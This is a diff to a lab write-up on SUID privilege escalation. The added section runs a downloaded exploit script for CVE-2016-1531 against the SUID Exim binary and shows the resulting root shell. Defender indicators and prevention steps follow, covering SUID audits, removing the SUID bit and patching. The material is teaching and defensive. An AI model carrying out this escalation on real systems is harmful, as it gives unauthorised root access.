@@ -1,7 +1,7 @@
 
 # SUID/SGID — Privilege Escalation
 
-**Date:** June 2026 <br>
+**Date:** July 2026 <br>
 **Author:** ShahinSecLab <br>
 **Category:** Privilege Escalation <br>
 **Difficulty:** Medium <br>
@@ -271,3 +271,88 @@ user@debian:~$ ls
 ```
 
 The file downloaded successfully but had no execute permission yet. I needed to add that before running it.
+
+## Step 5 — Running the Exploit and Getting Root
+
+### Added Execute Permission
+
+```bash
+user@debian:~$ chmod +x 39535.sh
+```
+### Confirmed the Permission Change
+
+```bash
+user@debian:~$ ls -la
+```
+```
+-rwxr-xr-x 1 user user  638 Jan 14 03:51 39535.sh
+```
+The file now had execute permission — ready to run.
+
+### Ran the Exploit
+
+```bash
+user@debian:~$ ./39535.sh
+```
+**Output:**
+
+```
+[ CVE-2016-1531 local root exploit
+```
+### Confirmed Root Access
+
+```bash
+sh-4.1# whoami
+```
+```
+root
+```
+```bash
+sh-4.1# id
+```
+```
+uid=0(root) gid=1000(user) groups=0(root)
+```
+I went from a normal low privilege user straight to `root` by exploiting the SUID bit on the Exim binary using CVE-2016-1531.
+
+## How Defenders Can Catch This
+
+```
+|                     Indicator                            |            What to Look For                   |
+|----------------------------------------------------------|-----------------------------------------------|
+| Unusual SUID binaries on the system                      | Regular SUID audits                           |
+| Exploit script downloaded using `wget` or `curl`         | Network monitoring and process logs           |
+| Unexpected root shell spawned from a normal user session | Audit logs (for example, `/var/log/auth.log`) |
+| Outdated software with known CVEs                        | Regular vulnerability scans                   |
+| `chmod` run on a newly downloaded script                 | File activity monitoring                      |
+```
+
+## How to Prevent It
+
+### Audit SUID binaries regularly
+
+Run this regularly and compare against a known good baseline:
+
+```bash
+find / -type f -perm -4000 2>/dev/null
+```
+Remove the SUID bit from any binary that does not absolutely need it:
+
+```bash
+chmod u-s /usr/sbin/exim-4.84-3
+```
+
+### Keep software updated
+
+CVE-2016-1531 was patched in Exim 4.86.2. Keeping software updated removes the vulnerability completely:
+
+```bash
+sudo apt update && sudo apt upgrade
+```
+### Remove unnecessary software
+
+If Exim or any other mail server is not needed on the machine, remove it completely:
+
+```bash
+sudo apt remove exim4
+```
